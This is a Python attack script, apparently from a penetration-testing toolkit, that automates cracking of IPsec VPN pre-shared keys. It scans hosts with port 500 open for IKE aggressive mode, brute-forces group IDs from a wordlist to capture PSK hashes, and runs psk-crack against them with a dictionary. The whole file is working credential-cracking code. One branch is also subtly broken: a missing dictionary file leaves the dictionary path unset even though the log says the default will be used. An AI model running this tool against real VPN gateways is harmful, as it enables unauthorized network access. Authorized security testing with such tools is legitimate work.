"""
Pike Brute is a python version of KMGBully's (https://github.com/kmgbully) ikebrute.

This script will run ike-scan on all ips with port 500 open and look for any that are in aggressive mode.
All aggressive mode VPNs are then run through ike-scan again with each id in the wordlist.dic file and
the hashes are saved. Once ike-scan is done psk-crack is run on each of the hash files using either a
provided dictionary or the default psk-crack-dictionary if one is not provided. The output of psk-crack
is saved to a file pskbrute_results.txt file, if the psk appears to be cracked the script will save that
entry to the cracked_psks.txt file.

Parameters
----------
input : string
    Required. Path to a csv file in the same format that is provided by the nmap_to_csv.py script.
out_dir : string
    Required. Path to the folder where the output is stored.
--dictionary,d : string
    Optional. Path to a dictionary file to use. If not supplied the psk-crack-dictionary will be used.
-v : None
    Optional. The more v's provided the more verbose the script output will be. Debug is -vvv.

"""
import os
import argparse
import subprocess
import logging

from utils import utils, logging_config  # noqa pylint: disable=unused-import
from config import config


LOG = logging.getLogger("ptscripts.multi_pikebrute")


def run_ike_scan(name, ip, output=None):
    logger = logging.getLogger('main.run_ike_scan')
    if output:
        hash_file = "{}_{}.hash".format(ip, name)
        hash_path = os.path.join(output, hash_file)
    command_text = 'ike-scan -M -A {}--id={} {}'.format(
        "--pskcrack={} ".format(hash_path) if output else "", name, ip)
    logger.info('Running command: {}'.format(command_text))
    command = command_text.split()
    cp = subprocess.run(command, stdout=subprocess.PIPE)  # pylint: disable=no-member
    return cp.stdout.decode('utf-8')


def run_pskcrack(psk_file, dictionary_path):
    logger = logging.getLogger('main.run_pskcrack')
    command_text = 'psk-crack {} --dictionary={}'.format(psk_file, dictionary_path)
    logger.info('Running command: {}'.format(command_text))
    command = command_text.split()
    cp = subprocess.run(command, stdout=subprocess.PIPE)  # pylint: disable=no-member
    return cp.stdout.decode('utf-8')


def capture_hashes(ip_dir, wordlist, ip):
    """ Runs ike-scan with each name in wordlist and captures the hash. """
    for name in wordlist:
        results = run_ike_scan(name, ip, ip_dir)
        LOG.debug(results)


def is_aggressive(ip):
    """ We run ike-scan and look for aggressive in output. We return True if aggressive."""
    results = run_ike_scan('test', ip)
    LOG.debug('Results: {}'.format(results))
    if "Aggressive Mode" in results:
        LOG.info('Aggressive mode found for ip {}'.format(ip))
        return True
    else:
        LOG.info('No aggressive mode found.')


def get_ike_aggressive(ips):
    aggressive_ips = []
    for ip in ips:
        LOG.info('Checking ike aggressive mode on ip: {}'.format(ip))
        if is_aggressive(ip):
            aggressive_ips.append(ip)
    return aggressive_ips


def filter_pskcrack_output(results, ip, ip_dir, psk_file):
    """ Takes the results from run_pskcrack and filters the output to only the result line. """
    output = ""
    cracked = ""
    lines = results.splitlines()
    for line in lines:
        if not line.startswith(('Starting', 'Ending', 'Running')):
            if not line.startswith('no match found'):
                LOG.info('PSK Cracked!: {}'.format(line))
                cracked = "Cracked psk on ip: {}. PSK file: {}, psk-crack output: {}".format(
                    ip, os.path.join(ip_dir, psk_file), line)
            output = line
    return (output, cracked)


def main(args):  # pylint: disable=too-many-locals
    """ Wrapper for the pikebrute function that runs it once per ip. """
    output = []
    cracked = []
    ike_dir = os.path.join(args.out_dir, "ike")
    utils.dir_exists(ike_dir, True)
    if args.dictionary:
        if os.path.isfile(args.dictionary):
            LOG.info('Using dictionary provided in arguments here: {}'.format(args.dictionary))
            dictionary_path = args.dictionary
        else:
            LOG.warning('Dictionary provided ({}) cannot be found, using the default.'.format(
                args.dictionary))
    else:
        dictionary_path = os.path.join(config.SCRIPTS_PATH, 'utils/psk-crack-dictionary')
        LOG.info('Using the default dictionary: {}'.format(dictionary_path))
    ike_ips = utils.get_ips_with_port_open(args.input, 500)
    aggressive = get_ike_aggressive(ike_ips)
    vpn_name_list = utils.text_file_lines_to_list(os.path.join(config.SCRIPTS_PATH, 'utils/wordlist.dic'))
    for ip in aggressive:
        ip_dir = os.path.join(ike_dir, ip)
        utils.dir_exists(ip_dir, True)
        capture_hashes(ip_dir, vpn_name_list, ip)
        # Run psk-crack
        psk_files = utils.find_files(ip_dir, suffix='.hash')
        for psk_file in psk_files:
            results = run_pskcrack(os.path.join(ip_dir, psk_file), dictionary_path)
            filtered_out, filtered_cracked = filter_pskcrack_output(results, ip, ip_dir, psk_file)
            if filtered_out:
                output.append(filtered_out)
            if filtered_cracked:
                cracked.append(filtered_cracked)
    results_file = os.path.join(args.out_dir, "pikebrute_results.txt")
    cracked_file = os.path.join(args.out_dir, "cracked_psks.txt")
    with open(results_file, 'w') as f:
        f.write('\r\n'.join(output))
    if cracked:
        with open(cracked_file, 'w') as f:
            f.write('\r\n'.join(cracked))


def parse_args(args):
    parser = argparse.ArgumentParser(
        parents=[utils.parent_argparser()],
        description='Run pikebrute on multiple servers.',
        prog='pikebrute.py',
    )
    parser.add_argument('input', help='CSV File created from nmap_to_csv.py.')
    parser.add_argument('out_dir', help='Output directory and working folder.')
    parser.add_argument(
        '--dictionary', '-d',
        help='Dictionary that psk_crack should use. If not provided the script will use the \
psk-crack-dictionary. Must be the full path to the file.')
    args = parser.parse_args(args)
    logger = logging.getLogger("ptscripts")
    if args.quiet:
        logger.setLevel('ERROR')
    elif args.verbose:
        logger.setLevel('DEBUG')
    else:
        logger.setLevel('INFO')
    return args


if __name__ == '__main__':
    import sys
    main(parse_args(sys.argv[1:]))
